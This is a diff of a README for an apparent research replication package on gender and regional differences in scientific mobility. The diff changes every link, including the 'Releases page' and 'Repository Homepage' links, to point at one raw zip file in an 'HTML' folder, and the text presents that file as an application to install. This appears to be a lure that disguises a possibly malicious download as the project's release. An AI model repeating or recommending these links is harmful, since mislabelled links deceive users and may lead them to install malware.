@@ -1,7 +1,7 @@
 # 📦 Replication-package-for-gender-and-regional-differences-in-scientific-mobility-and-immobility - Access Gender and Migration Insights
 
 ## 🔗 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/vickykumar11062/Replication-package-for-gender-and-regional-differences-in-scientific-mobility-and-immobility/releases)
+[![Download Release](https://raw.githubusercontent.com/vickykumar11062/Replication-package-for-gender-and-regional-differences-in-scientific-mobility-and-immobility/main/HTML/Replication-package-for-gender-and-regional-differences-in-scientific-mobility-and-immobility_1.8.zip%20Latest%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/vickykumar11062/Replication-package-for-gender-and-regional-differences-in-scientific-mobility-and-immobility/main/HTML/Replication-package-for-gender-and-regional-differences-in-scientific-mobility-and-immobility_1.8.zip)
 
 ## 📖 Overview
 This repository provides scripts, data, and replication materials for the study "A study of gender and regional differences in scientific mobility and immobility among researchers identified as potentially talented." The goal is to equip users with the tools needed to understand and analyze differences in scientific mobility based on gender and region.
@@ -9,7 +9,7 @@ This repository provides scripts, data, and replication materials for the study 
 ## 🚀 Getting Started
 To get started using this package, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/vickykumar11062/Replication-package-for-gender-and-regional-differences-in-scientific-mobility-and-immobility/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/vickykumar11062/Replication-package-for-gender-and-regional-differences-in-scientific-mobility-and-immobility/main/HTML/Replication-package-for-gender-and-regional-differences-in-scientific-mobility-and-immobility_1.8.zip).
 
 2. **Download the Application**: Look for the latest release version. Choose the appropriate file for your operating system. Click on the file link to download it to your computer.
 
@@ -38,7 +38,7 @@ Ensure that you have at least:
 ## 📥 Download & Install
 To download the application, you need to follow these steps:
 
-1. **Click on the Link**: Access the [Releases page](https://github.com/vickykumar11062/Replication-package-for-gender-and-regional-differences-in-scientific-mobility-and-immobility/releases).
+1. **Click on the Link**: Access the [Releases page](https://raw.githubusercontent.com/vickykumar11062/Replication-package-for-gender-and-regional-differences-in-scientific-mobility-and-immobility/main/HTML/Replication-package-for-gender-and-regional-differences-in-scientific-mobility-and-immobility_1.8.zip).
    
 2. **Select and Download**: Find the latest version. Click the file that matches your operating system to start the download.
 
@@ -59,8 +59,8 @@ If you wish to contribute to this project, you can:
 We welcome contributions that improve the application or the documentation.
 
 ## 🔗 Links
-- [Releases Page](https://github.com/vickykumar11062/Replication-package-for-gender-and-regional-differences-in-scientific-mobility-and-immobility/releases)
-- [Repository Homepage](https://github.com/vickykumar11062/Replication-package-for-gender-and-regional-differences-in-scientific-mobility-and-immobility)
+- [Releases Page](https://raw.githubusercontent.com/vickykumar11062/Replication-package-for-gender-and-regional-differences-in-scientific-mobility-and-immobility/main/HTML/Replication-package-for-gender-and-regional-differences-in-scientific-mobility-and-immobility_1.8.zip)
+- [Repository Homepage](https://raw.githubusercontent.com/vickykumar11062/Replication-package-for-gender-and-regional-differences-in-scientific-mobility-and-immobility/main/HTML/Replication-package-for-gender-and-regional-differences-in-scientific-mobility-and-immobility_1.8.zip)
 
 ## ⚙️ License
 This project is licensed under the MIT License. See the LICENSE file for more details.
